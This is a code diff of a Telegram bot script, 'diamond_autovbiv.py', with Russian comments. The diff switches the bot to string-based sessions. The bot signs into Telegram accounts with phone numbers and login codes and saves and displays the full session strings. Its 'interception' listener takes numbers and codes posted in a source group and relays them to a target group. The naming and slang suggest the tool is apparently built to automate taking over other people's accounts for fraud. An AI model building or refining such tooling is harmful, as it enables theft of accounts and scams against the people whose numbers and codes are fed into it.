@@ -1,5 +1,5 @@
 # diamond_autovbiv.py
-# FINAL WORKING VERSION
+# FINAL — С ИСПРАВЛЕННЫМИ СЕССИЯМИ (StringSession)
 
 import os
 import asyncio
@@ -10,21 +10,19 @@ from datetime import datetime
 from telethon import TelegramClient, events
 from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, FloodWaitError
 from telethon.tl.custom import Button
+from telethon.sessions import StringSession
 
-# ========== КОНФИГ ДЛЯ RAILWAY ==========
+# ========== КОНФИГ ==========
 API_ID = int(os.environ.get("API_ID", 0))
 API_HASH = os.environ.get("API_HASH", "")
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
-
-SESSION_DIR = os.environ.get("SESSION_DIR", "/app/sessions")
-os.makedirs(SESSION_DIR, exist_ok=True)
 
 DB_PATH = "/app/diamond_data.db"
 BACKUP_DIR = "/app/backups"
 os.makedirs(BACKUP_DIR, exist_ok=True)
 
 if not API_ID or not API_HASH or not BOT_TOKEN:
-    print("❌ Ошибка: Установите переменные в Railway: API_ID, API_HASH, BOT_TOKEN")
+    print("❌ Ошибка: Установите переменные в Railway")
     exit(1)
 
 # ========== БАЗА ДАННЫХ ==========
@@ -73,7 +71,7 @@ class DiamondDB:
         self.conn.commit()
     
     def save_session(self, user_id, phone, session_string, step):
-        print(f"[DB] Сохранение сессии: user={user_id}, phone={phone}, step={step}, session_len={len(session_string) if session_string else 0}")
+        print(f"[DB] Сохраняем сессию для {user_id}, длина строки {len(session_string) if session_string else 0}")
         self.cursor.execute('''
             INSERT OR REPLACE INTO sessions (user_id, phone, session_string, step, created_at)
             VALUES (?, ?, ?, ?, ?)
@@ -83,7 +81,7 @@ class DiamondDB:
         self.cursor.execute('SELECT session_string FROM sessions WHERE user_id = ?', (user_id,))
         row = self.cursor.fetchone()
         if row and row[0]:
-            print(f"[DB] Сессия успешно сохранена, длина {len(row[0])}")
+            print(f"[DB] Сессия сохранена успешно")
         else:
             print(f"[DB] ОШИБКА: сессия не сохранилась!")
     
@@ -94,9 +92,7 @@ class DiamondDB:
     
     def is_authorized(self, user_id):
         session_string, _, _ = self.get_session(user_id)
-        authorized = bool(session_string and session_string.strip())
-        print(f"[DB] is_authorized({user_id}) = {authorized}")
-        return authorized
+        return bool(session_string and session_string.strip())
     
     def set_groups(self, user_id, source_group, target_group):
         self.cursor.execute('''
@@ -183,7 +179,7 @@ def get_code_keyboard():
         [Button.inline("0", b"0"), Button.inline("⌫", b"del"), Button.inline("✅", b"submit")]
     ]
 
-# ========== ФУНКЦИИ ДЛЯ НОМЕРОВ ==========
+# ========== ФУНКЦИИ ДЛЯ НОМЕРОВ И КОДОВ ==========
 def clean_phone(phone):
     cleaned = re.sub(r'[^\d+]', '', phone)
     cleaned = re.sub(r'^\+{2,}', '+', cleaned)
@@ -219,7 +215,9 @@ def extract_code_from_text(text):
     match = re.search(r'\b(\d{4,8})\b', text)
     return match.group(1) if match else None
 
+# ========== РАБОТА С КЛИЕНТАМИ (StringSession) ==========
 async def get_user_client(user_id, session_string=None):
+    """Восстанавливает клиента из строки сессии"""
     if user_id in user_clients:
         client = user_clients[user_id]
         if client.is_connected():
@@ -228,15 +226,18 @@ async def get_user_client(user_id, session_string=None):
         session_string, _, _ = db.get_session(user_id)
         if not session_string:
             return None
-    session_path = os.path.join(SESSION_DIR, f"user_{user_id}")
-    client = TelegramClient(session_path, API_ID, API_HASH)
-    await client.connect()
-    if session_string:
-        client.session.set_session_str(session_string)
+    try:
+        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
+        await client.connect()
         if await client.is_user_authorized():
             user_clients[user_id] = client
             return client
-    return None
+        else:
+            print(f"[WARN] Сессия для {user_id} не авторизована")
+            return None
+    except Exception as e:
+        print(f"[ERROR] Ошибка восстановления клиента: {e}")
+        return None
 
 # ========== ОБРАБОТЧИКИ ==========
 async def setup_handlers():
@@ -245,7 +246,7 @@ async def setup_handlers():
     @bot.on(events.NewMessage(pattern='/start'))
     async def start_cmd(event):
         await event.reply("""
-💎 DIAMOND AUTOVBIV BOT
+💎 DIAMOND AUTOVBIV BOT (StringSession)
 
 /login +79991234567
 /set_source — в группе с номерами/кодами
@@ -261,14 +262,14 @@ async def setup_handlers():
         user_id = event.sender_id
         phone = clean_phone(event.pattern_match.group(1).strip())
         await event.reply(f"📱 Отправляю код на {phone}...")
-        session_path = os.path.join(SESSION_DIR, f"temp_{user_id}")
-        client = TelegramClient(session_path, API_ID, API_HASH)
+        # Используем StringSession
+        client = TelegramClient(StringSession(), API_ID, API_HASH)
         await client.connect()
         try:
             await client.send_code_request(phone)
             user_clients[user_id] = client
             db.save_session(user_id, phone, "", "waiting_code")
-            user_code_inputs[user_id] = {'code': '', 'phone': phone, 'attempts': 0}
+            user_code_inputs[user_id] = {'code': '', 'phone': phone, 'attempts': 0, 'client': client}
             await event.reply(
                 f"✅ Код отправлен на {phone}\n\n🔢 Введите код через кнопки:\n\nКод: ` `",
                 buttons=get_code_keyboard()
@@ -287,10 +288,14 @@ async def setup_handlers():
             return
         try:
             await client.sign_in(password=password)
-            session_string = client.session.save()
+            session_string = client.session.save()  # теперь строка
             phone = (await client.get_me()).phone
             db.save_session(user_id, phone, session_string, "authorized")
             await event.reply(f"✅ Вход выполнен!\nАккаунт: {phone}\n\n🔑 Session string:\n`{session_string}`")
+            # Запускаем слушатели если есть группы
+            source, target = db.get_groups(user_id)
+            if source:
+                asyncio.create_task(start_source_listener(user_id, client, source))
         except Exception as e:
             await event.reply(f"❌ Ошибка: {str(e)}")
     
@@ -320,9 +325,13 @@ async def setup_handlers():
                 return
             await event.answer("⏳ Проверяю...")
             client = user_clients.get(user_id)
+            if not client:
+                await event.edit("❌ Клиент потерян, начните /login заново")
+                del user_code_inputs[user_id]
+                return
             try:
                 await client.sign_in(code=code)
-                session_string = client.session.save()
+                session_string = client.session.save()  # теперь строка
                 print(f"[LOG] Получена session_string длиной {len(session_string)}")
                 user_phone = (await client.get_me()).phone
                 db.save_session(user_id, user_phone, session_string, "authorized")
@@ -340,6 +349,10 @@ async def setup_handlers():
                     )
                 else:
                     await event.edit(f"⚠️ Вход выполнен, но сессия НЕ СОХРАНИЛАСЬ!\n\nАккаунт: {user_phone}\n\nSession string (вставьте вручную):\n`{session_string}`")
+                # Запускаем слушатель если есть источник
+                source, target = db.get_groups(user_id)
+                if source:
+                    asyncio.create_task(start_source_listener(user_id, client, source))
                 del user_code_inputs[user_id]
             except PhoneCodeInvalidError:
                 user_code_inputs[user_id]['attempts'] += 1
@@ -366,7 +379,13 @@ async def setup_handlers():
             _, target_group = db.get_groups(user_id)
             db.set_groups(user_id, source_group, target_group)
             await event.reply(f"✅ **ГРУППА-ИСТОЧНИК установлена!**\nБот будет следить за номерами и кодами здесь.")
-            print(f"[LOG] Источник {source_group} для пользователя {user_id}")
+            # Если уже есть сессия — запускаем слушателя
+            if db.is_authorized(user_id):
+                session_string, _, _ = db.get_session(user_id)
+                if session_string:
+                    client = await get_user_client(user_id, session_string)
+                    if client:
+                        asyncio.create_task(start_source_listener(user_id, client, source_group))
         else:
             await event.reply("❌ Команда работает только в группе.")
     
@@ -379,7 +398,6 @@ async def setup_handlers():
             source_group, _ = db.get_groups(user_id)
             db.set_groups(user_id, source_group, target_group)
             await event.reply(f"✅ **ГРУППА-ЦЕЛЬ установлена!**\nСюда будут приходить номера и коды, здесь жду 'встал'.")
-            print(f"[LOG] Цель {target_group} для пользователя {user_id}")
             if source_group and db.is_authorized(user_id):
                 session_string, _, _ = db.get_session(user_id)
                 if session_string:
@@ -429,7 +447,7 @@ async def setup_handlers():
         db.conn.commit()
         await event.reply("✅ Сброшено. Используйте /login")
     
-    # ========== ОСНОВНАЯ ЛОГИКА ПЕРЕХВАТА ==========
+    # ========== ЛОГИКА ПЕРЕХВАТА ==========
     async def start_source_listener(user_id, client, source_group_id):
         print(f"[LOG] Слушатель запущен для {user_id} в группе {source_group_id}")
         @client.on(events.NewMessage(chats=source_group_id))
@@ -493,9 +511,8 @@ async def restore_sessions():
     for user_id, sess_str in rows:
         print(f"[LOG] Восстанавливаю сессию для {user_id}")
         try:
-            client = TelegramClient(os.path.join(SESSION_DIR, f"user_{user_id}"), API_ID, API_HASH)
+            client = TelegramClient(StringSession(sess_str), API_ID, API_HASH)
             await client.connect()
-            client.session.set_session_str(sess_str)
             if await client.is_user_authorized():
                 user_clients[user_id] = client
                 print(f"[LOG] Сессия {user_id} восстановлена")
@@ -510,10 +527,9 @@ async def restore_sessions():
 # ========== ЗАПУСК ==========
 async def main():
     global bot
-    print("💎 DIAMOND AUTOVBIV BOT v4.0 FINAL")
+    print("💎 DIAMOND AUTOVBIV BOT v4.1 (StringSession)")
     print(f"📡 API_ID: {API_ID}")
-    bot = TelegramClient(os.path.join(SESSION_DIR, "main_bot"), API_ID, API_HASH)
-    await bot.start(bot_token=BOT_TOKEN)
+    bot = TelegramClient("diamond_bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
     await restore_sessions()
     await setup_handlers()
     print("✅ Бот запущен. Логи включены.")
